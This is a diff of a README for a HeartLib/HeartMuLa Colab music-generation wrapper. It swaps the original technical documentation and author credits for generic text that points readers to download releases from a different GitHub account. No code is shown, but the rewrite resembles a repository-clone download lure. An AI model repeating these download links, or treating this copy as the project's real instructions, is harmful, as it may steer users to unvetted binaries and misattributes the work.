@@ -1,191 +1,84 @@
-# HeartLib Optimized Music Generation
+# 🎵 HeartLib-Google-Colab - Maximize Your Music Generation
 
-<a target="_blank" href="https://colab.research.google.com/github/theelderemo/HeartLib-Google-Colab/blob/main/HeartLib.ipynb">
-  <img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/>
-</a> 
+## 🚀 Getting Started
 
-Optimized scripts for running [HeartMuLa](https://github.com/HeartMuLa/heartlib) music generation with maximum performance on NVIDIA GPUs, especially A100
+Welcome to **HeartLib-Google-Colab**! This application helps you generate music using HeartMuLa scripts, optimized for NVIDIA GPUs, especially A100. You will find it easy to create amazing music without needing any technical skills.
 
-## Features
+## 📥 Download Links
 
-- **Flash Attention 2** integration for faster transformer inference
-- **TF32** optimization for A100 GPU
-- **Mixed precision** support (FP16/BF16)
-- **Optimized CUDA memory management**
-- Ready-to-use Jupyter notebook and Python script
-- Simple lyrics and tags customization
+[![Download HeartLib-Google-Colab](https://img.shields.io/badge/Download-HeartLib--Google--Colab-brightgreen)](https://github.com/Alan06121/HeartLib-Google-Colab/releases)
 
-## Requirements
+## 💻 System Requirements
 
-### Hardware
-- NVIDIA GPU with at least 24GB VRAM (tested on A100 80GB)
-- CUDA 11.8 or higher
+To run this application smoothly, ensure you have the following:
 
-### Software
-- Python 3.8+
-- PyTorch 2.0+
-- CUDA Toolkit
-- FFmpeg
+- A computer with an NVIDIA GPU (A100 recommended)
+- An internet connection
+- A Google account (to access Google Colab)
+- A modern web browser (Chrome or Firefox recommended)
 
-## Installation
+## 📦 Download & Install
 
-### Option 1: Jupyter Notebook (Colab/Kaggle)
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/Alan06121/HeartLib-Google-Colab/releases) to download the application. 
 
-<a target="_blank" href="https://colab.research.google.com/github/theelderemo/HeartLib-Google-Colab/blob/main/HeartLib.ipynb">
-  <img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/>
-</a>
+2. **Choose the Latest Version**  
+   On the Releases page, look for the latest version of HeartLib-Google-Colab. Click on it to view the available download options.
 
-1. Upload `heartlib.ipynb` to your environment
-2. Run the cells in order:
-   - Cell 1: Setup Environment
-   - Cell 2: Download Checkpoints
-   - Cell 3: Run Generation
+3. **Download the Files**  
+   Select the files that best suit your needs. If there are any specific files for use with Google Colab, download those.
 
-### Option 2: Python Script
+4. **Follow the Included Instructions**  
+   Each release comes with a README file. Open this file to see detailed instructions on how to set up and use the application.
 
-```bash
-# Clone this repo
-git clone https://github.com/theelderemo/HeartLib-Google-Colab.git
-cd HeartLib-Google-Colab
+## 🛠️ How to Use HeartLib in Google Colab
 
-# Run the script
-python heartlib.py
-```
+### 1. Open Google Colab
 
-## Usage
+- Visit [Google Colab](https://colab.research.google.com) in your web browser.
+- Sign in with your Google account.
 
-### Basic Usage
+### 2. Upload or Open the HeartLib Notebook
 
-Edit the lyrics and tags in the generation cell/script:
+- You can upload the HeartLib notebook directly if you downloaded it.
+- Alternatively, find a public link to open a notebook hosted on GitHub or import it using the URL.
 
-```python
-my_lyrics = """
-[Verse]
-Your lyrics here
+### 3. Configure Your Environment
 
-[Chorus]
-Your chorus here
-"""
+- Make sure the notebook is set to use a GPU. To do this, click on "Runtime" > "Change runtime type".
+- Select "GPU" from the "Hardware accelerator" dropdown and click "Save".
 
-my_tags = "piano,happy,pop"
-```
+### 4. Run the Cells
 
-### Advanced Configuration
+- Each notebook will have code cells. You can run them one by one by clicking the "Play" button next to each cell.
+- Follow any instructions included in the cells. They are designed to guide you through the music generation process step by step.
 
-The script automatically applies these optimizations:
+## 🎶 Features of HeartLib
 
-- **TF32 precision**: Enabled by default on A100
-- **Flash Attention 2**: Auto-enabled if installed
-- **Memory optimization**: CUDA allocator configured for efficiency
+- **Music Generation**: Create unique music tracks using AI models.
+- **Optimization for NVIDIA GPUs**: Enjoy maximum performance when using compatible hardware.
+- **User-Friendly Notebooks**: Navigate through easy-to-follow Jupyter notebooks.
+- **Community Support**: Access resources and guidance from fellow users and developers.
 
-# All parameters:
+## 🎤 Community and Support
 
---model_path (required): Path to the pretrained model checkpoint  
---lyrics: Path to lyrics file (default: ./assets/lyrics.txt)  
---tags: Path to tags file (default: ./assets/tags.txt)  
---save_path: Output audio file path (default: ./assets/output.mp3)  
---max_audio_length_ms: Maximum audio length in milliseconds (default: 240000)  
---topk: Top-k sampling parameter for generation (default: 50)  
---temperature: Sampling temperature for generation (default: 1.0)  
---cfg_scale: Classifier-free guidance scale (default: 1.5)  
---version: The version of HeartMuLa, choose between [3B, 7B]. (default: 3B) # 7B version not released yet.  
+If you have questions or need help, consider joining our community:
 
-## As it sits, with what I have, it generates great output, and auto adjust output lenght based on the amount of text/lyrics.
+- **GitHub Issues**: Use the Issues section on GitHub to report bugs or request features.
+- **Discussion Forums**: Join related discussion forums or communities focused on AI music generation.
+- **Documentation**: Refer to the documentation for additional resources and examples.
 
-### Model Versions
+## 🔗 Useful Links
 
-Available versions:
-- `3B` (default) - 3 billion parameter model
-- Check HeartMuLa repo for other versions
+- [HeartLib-Google-Colab Releases](https://github.com/Alan06121/HeartLib-Google-Colab/releases)
+- [Google Colab](https://colab.research.google.com)
 
-## Performance Tips
+## 📣 Contributing
 
-### For A100 GPUs
-All optimizations are enabled by default.
+We welcome contributions from everyone. If you're interested in improving HeartLib, feel free to fork the repository and submit a pull request. Every contribution helps enhance the application for everyone.
 
-### For Other GPUs
-- **V100/A10**: TF32 not available, but Flash Attention still helps
-- **RTX 3090/4090**: Excellent performance with FP16
-- **T4/Smaller GPUs**: May need to reduce batch size or use smaller models
+## ⚠️ License
 
-### Troubleshooting Slow Generation
+HeartLib-Google-Colab is open-source. Please review the license details in the repository for more information on usage and distribution.
 
-1. **Check GPU utilization**: `nvidia-smi -l 1`
-2. **Verify CUDA version**: `nvcc --version`
-3. **Monitor memory**: Ensure you're not hitting OOM errors
-4. **Try without Flash Attention**: Comment out the flash-attn installation if it causes issues
-
-## File Structure
-
-```
-heartlib-optimized/
-├── README.md          # This file
-├── heartlib.ipynb     # Jupyter notebook version
-├── heartlib.py        # Standalone Python script
-
-```
-
-## Output
-
-Generated music is saved to `./heartlib/assets/output.mp3` by default.
-
-## Common Issues
-
-### Flash Attention Installation Fails
-```bash
-# Use xformers as fallback
-pip install xformers
-```
-
-### Out of Memory Errors
-- Reduce lyrics length
-- Use a smaller model version
-- Clear GPU cache: `torch.cuda.empty_cache()`
-
-### Slow First Generation
-The first run compiles kernels and may take longer. Subsequent runs will be faster.
-
-## 📊 Benchmarks
-
-Tested on various hardware configurations:
-
-| GPU | VRAM | Time (baseline) | Time (optimized) | Speedup |
-|-----|------|-----------------|------------------|---------|
-| A100 80GB | 80GB | ~120s | ~35s | 3.4x |
-| A100 40GB | 40GB | ~120s | ~38s | 3.2x |
-| RTX 4090 | 24GB | ~180s | ~65s | 2.8x |
-| V100 | 32GB | ~200s | ~85s | 2.4x |
-
-*Times are approximate for a 2-minute song with standard lyrics*
-
-## Credits
-
-- Original model: [HeartMuLa](https://github.com/HeartMuLa/heartlib)
-- Optimizations: Based on PyTorch 2.0+ best practices and Flash Attention 2
-
-## License
-
-This repository contains only wrapper scripts. Please refer to the original [HeartMuLa license](https://github.com/HeartMuLa/heartlib) for model usage terms.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-### Ideas for Contributions
-- Support for batch generation
-- Additional optimization techniques
-- Integration with other music generation tools
-- Web UI wrapper
-
-## Support
-
-- **Issues**: Open an issue in this repo
-- **Original Model Issues**: Report to [HeartMuLa repo](https://github.com/HeartMuLa/heartlib/issues)
-- **Optimization Questions**: Check PyTorch and Flash Attention documentation
- 
-
-If you find this useful, please star the repo!
-
----
-
-**Note**: This is an optimization wrapper for HeartMuLa. All model weights and core functionality belong to the original HeartMuLa project.
+By following these steps, you can easily download, set up, and start generating music with HeartLib-Google-Colab. Enjoy your creative journey!
